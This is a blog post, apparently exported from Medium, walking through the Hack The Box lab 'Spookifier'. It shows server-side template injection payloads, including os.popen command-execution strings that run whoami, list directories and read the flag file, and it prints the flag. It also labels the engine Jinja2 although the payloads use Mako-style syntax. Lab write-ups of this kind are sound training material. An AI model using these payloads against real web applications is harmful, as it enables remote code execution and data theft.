<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>HTB Labs : Spookifier | Web Exploitation Write-up</title><style>
      * {
        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
      }
      html, body {
        margin: 0;
        padding: 0;
      }
      h1 {
        font-size: 50px;
        margin-bottom: 17px;
        color: #333;
      }
      h2 {
        font-size: 24px;
        line-height: 1.6;
        margin: 30px 0 0 0;
        margin-bottom: 18px;
        margin-top: 33px;
        color: #333;
      }
      h3 {
        font-size: 30px;
        margin: 10px 0 20px 0;
        color: #333;
      }
      header {
        width: 640px;
        margin: auto;
      }
      section {
        width: 640px;
        margin: auto;
      }
      section p {
        margin-bottom: 27px;
        font-size: 20px;
        line-height: 1.6;
        color: #333;
      }
      section img {
        max-width: 640px;
      }
      footer {
        padding: 0 20px;
        margin: 50px 0;
        text-align: center;
        font-size: 12px;
      }
      .aspectRatioPlaceholder {
        max-width: auto !important;
        max-height: auto !important;
      }
      .aspectRatioPlaceholder-fill {
        padding-bottom: 0 !important;
      }
      header,
      section[data-field=subtitle],
      section[data-field=description] {
        display: none;
      }
      </style></head><body><article class="h-entry">
<header>
<h1 class="p-name">HTB Labs : Spookifier | Web Exploitation Write-up</h1>
</header>
<section data-field="subtitle" class="p-summary">
Category: Web
</section>
<section data-field="body" class="e-content">
<section name="49ea" class="section section--body section--first"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="75f1" id="75f1" class="graf graf--h3 graf--leading graf--title">HTB Labs : Spookifier | Web Exploitation</h3><figure name="a3da" id="a3da" class="graf graf--figure graf-after--h3"><img class="graf-image" data-image-id="1*UveA2tZ-VBKflhYYjIgw4Q.png" data-width="1098" data-height="288" data-is-featured="true" src="https://cdn-images-1.medium.com/max/800/1*UveA2tZ-VBKflhYYjIgw4Q.png"></figure><p name="cdfc" id="cdfc" class="graf graf--p graf-after--figure graf--trailing"><strong class="markup--strong markup--p-strong">Category:</strong> Web</p></div></div></section><section name="f903" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="359d" id="359d" class="graf graf--h3 graf--leading">Challenge Scenario</h3><p name="948b" id="948b" class="graf graf--p graf-after--h3 graf--trailing">A new application has emerged that generates a “spooky” name for its users. Shortly after its release, users reported that their real names were mysteriously altered, causing chaos in their daily lives. Your task is to investigate the application and help take it down.</p></div></div></section><section name="2b2b" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="1132" id="1132" class="graf graf--h3 graf--leading">Initial Assessment</h3><p name="6371" id="6371" class="graf graf--p graf-after--h3">During initial testing, we observed that user-supplied input was reflected back in the response with altered font styling. When a name was entered into the input field, it appeared directly in the output, indicating that user input was being processed dynamically on the server side.</p><p name="fff2" id="fff2" class="graf graf--p graf-after--p">This behavior suggested the possibility of <strong class="markup--strong markup--p-strong">Server-Side Template Injection (SSTI)</strong>.</p><figure name="7246" id="7246" class="graf graf--figure graf-after--p graf--trailing"><img class="graf-image" data-image-id="1*2fRvYp4OgXj7RXa8LGpS4w.png" data-width="1365" data-height="694" src="https://cdn-images-1.medium.com/max/800/1*2fRvYp4OgXj7RXa8LGpS4w.png"></figure></div></div></section><section name="7c75" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="94d9" id="94d9" class="graf graf--h3 graf--leading">SSTI Detection</h3><h3 name="9076" id="9076" class="graf graf--h3 graf-after--h3">Fuzzing for Template Injection</h3><p name="e13a" id="e13a" class="graf graf--p graf-after--h3">To identify whether the application was vulnerable to SSTI, we tested with a generic payload commonly used to trigger template parsing errors:</p><p name="cf75" id="cf75" class="graf graf--p graf-after--p"><strong class="markup--strong markup--p-strong">Payload:</strong></p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="bash" name="4869" id="4869" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-variable">${{&lt;%[%&#x27;&quot;}</span>}%\</span></pre><figure name="1b54" id="1b54" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*-33Tna38STa0_mI8fXljog.png" data-width="1364" data-height="683" src="https://cdn-images-1.medium.com/max/800/1*-33Tna38STa0_mI8fXljog.png"></figure><p name="f22a" id="f22a" class="graf graf--p graf-after--figure"><strong class="markup--strong markup--p-strong">Response:</strong></p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="vbnet" name="164b" id="164b" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">Internal Server <span class="hljs-keyword">Error</span><br />The server encountered an internal <span class="hljs-keyword">error</span> <span class="hljs-built_in">and</span> was unable <span class="hljs-keyword">to</span> complete your request.<br />Either the server <span class="hljs-built_in">is</span> overloaded <span class="hljs-built_in">or</span> there <span class="hljs-built_in">is</span> an <span class="hljs-keyword">error</span> <span class="hljs-keyword">in</span> the application.</span></pre><figure name="6272" id="6272" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*3eaXRufD4yY5-ddq54bnFg.png" data-width="1365" data-height="605" src="https://cdn-images-1.medium.com/max/800/1*3eaXRufD4yY5-ddq54bnFg.png"></figure><p name="79e7" id="79e7" class="graf graf--p graf-after--figure graf--trailing">This server-side error strongly indicated that the input was being interpreted by a template engine rather than treated as plain text.</p></div></div></section><section name="e451" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="022a" id="022a" class="graf graf--h3 graf--leading">Confirming Template Evaluation</h3><p name="6a22" id="6a22" class="graf graf--p graf-after--h3">To confirm template execution, we injected a simple arithmetic expression:</p><p name="3485" id="3485" class="graf graf--p graf-after--p"><strong class="markup--strong markup--p-strong">Payload:</strong></p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="bash" name="6695" id="6695" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-variable">${7*7}</span></span></pre><figure name="6519" id="6519" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*mSXB_8NahfUHHIrMk0onOg.png" data-width="1364" data-height="660" src="https://cdn-images-1.medium.com/max/800/1*mSXB_8NahfUHHIrMk0onOg.png"></figure><p name="13c2" id="13c2" class="graf graf--p graf-after--figure"><strong class="markup--strong markup--p-strong">Response:</strong></p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="typescript" name="1565" id="1565" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"><span class="hljs-number">49</span></span></pre><p name="068f" id="068f" class="graf graf--p graf-after--pre graf--trailing">This confirmed that user input was being evaluated server-side as a template expression, not rendered as a literal string — successfully confirming an <strong class="markup--strong markup--p-strong">SSTI vulnerability</strong>.</p></div></div></section><section name="f89e" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="347b" id="347b" class="graf graf--h3 graf--leading">Exploitation</h3><p name="14cb" id="14cb" class="graf graf--p graf-after--h3">Based on the payload behavior, the backend appeared to be using a <strong class="markup--strong markup--p-strong">Python-based template engine (Jinja2)</strong>. Using a known Jinja2 exploitation technique, we achieved command execution.</p><h3 name="3ea2" id="3ea2" class="graf graf--h3 graf-after--p">Command Execution Payload</h3><p name="9cfa" id="9cfa" class="graf graf--p graf-after--h3"><strong class="markup--strong markup--p-strong">Payload:</strong></p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="lua" name="7987" id="7987" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">${<span class="hljs-built_in">self</span>.<span class="hljs-built_in">module</span>.cache.util.<span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-built_in">read</span>()}</span></pre><p name="ca81" id="ca81" class="graf graf--p graf-after--pre graf--trailing">This payload successfully executed system commands, confirming <strong class="markup--strong markup--p-strong">remote code execution (RCE)</strong> via SSTI.</p></div></div></section><section name="527b" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="8bad" id="8bad" class="graf graf--h3 graf--leading">Flag Retrieval</h3><h3 name="dd7a" id="dd7a" class="graf graf--h3 graf-after--h3">Listing Root Directory</h3><p name="9772" id="9772" class="graf graf--p graf-after--h3">To locate the flag, we listed the contents of the root directory:</p><p name="1617" id="1617" class="graf graf--p graf-after--p"><strong class="markup--strong markup--p-strong">Payload:</strong></p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="lua" name="748f" id="748f" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">${<span class="hljs-built_in">self</span>.<span class="hljs-built_in">module</span>.cache.util.<span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>).<span class="hljs-built_in">read</span>()}</span></pre><figure name="21ce" id="21ce" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*3MeY1f1a37pUwSLqzQ50Xw.png" data-width="1365" data-height="693" src="https://cdn-images-1.medium.com/max/800/1*3MeY1f1a37pUwSLqzQ50Xw.png"></figure><p name="a964" id="a964" class="graf graf--p graf-after--figure graf--trailing">The output revealed the presence of <code class="markup--code markup--p-code">flag.txt</code>.</p></div></div></section><section name="7550" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="cfce" id="cfce" class="graf graf--h3 graf--leading">Reading the Flag</h3><p name="5f40" id="5f40" class="graf graf--p graf-after--h3"><strong class="markup--strong markup--p-strong">Payload:</strong></p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="lua" name="55cf" id="55cf" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">${<span class="hljs-built_in">self</span>.<span class="hljs-built_in">module</span>.cache.util.<span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;cat /flag.txt&#x27;</span>).<span class="hljs-built_in">read</span>()}</span></pre><figure name="59b1" id="59b1" class="graf graf--figure graf-after--pre graf--trailing"><img class="graf-image" data-image-id="1*Ft8OiqfMBwLbPYYwnlQrfw.png" data-width="1365" data-height="688" src="https://cdn-images-1.medium.com/max/800/1*Ft8OiqfMBwLbPYYwnlQrfw.png"></figure></div></div></section><section name="341a" class="section section--body"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="5cb0" id="5cb0" class="graf graf--h3 graf--leading">Flag</h3><p name="5e26" id="5e26" class="graf graf--p graf-after--h3">content of the flag.txt :</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="typescript" name="0574" id="0574" class="graf graf--pre graf-after--p graf--trailing graf--preV2"><span class="pre--content"><span class="hljs-variable constant_">HTB</span>{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}</span></pre></div></div></section><section name="58a8" class="section section--body section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><figure name="34f1" id="34f1" class="graf graf--figure graf--leading"><img class="graf-image" data-image-id="1*bv4hJ4ZuBPJugDGOksIetg.png" data-width="1366" data-height="768" src="https://cdn-images-1.medium.com/max/800/1*bv4hJ4ZuBPJugDGOksIetg.png"></figure><h3 name="c78a" id="c78a" class="graf graf--h3 graf-after--figure">References</h3><ul class="postList"><li name="19ca" id="19ca" class="graf graf--li graf-after--h3">Intigriti — Exploiting Server-Side Template Injection<br> <a href="https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-server-side-template-injection-ssti" data-href="https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-server-side-template-injection-ssti" class="markup--anchor markup--li-anchor" rel="noopener" target="_blank">https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-server-side-template-injection-ssti</a></li><li name="c3c3" id="c3c3" class="graf graf--li graf-after--li">PayloadsAllTheThings — SSTI Payloads<br> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" data-href="https://github.com/swisskyrepo/PayloadsAllTheThings" class="markup--anchor markup--li-anchor" rel="noopener" target="_blank">https://github.com/swisskyrepo/PayloadsAllTheThings</a></li><li name="a009" id="a009" class="graf graf--li graf-after--li graf--trailing">PortSwigger — Server-Side Template Injection<br> <a href="https://portswigger.net/web-security/server-side-template-injection" data-href="https://portswigger.net/web-security/server-side-template-injection" class="markup--anchor markup--li-anchor" rel="noopener" target="_blank">https://portswigger.net/web-security/server-side-template-injection</a></li></ul></div></div></section>
</section>
<footer><p>By <a href="https://medium.com/@conan0s4" class="p-author h-card">Alexander Sapo</a> on <a href="https://medium.com/p/225539bf5bc7"><time class="dt-published" datetime="2026-01-05T01:44:43.898Z">January 5, 2026</time></a>.</p><p><a href="https://medium.com/@conan0s4/htb-labs-spookifier-web-exploitation-225539bf5bc7" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on February 7, 2026.</p></footer></article></body></html>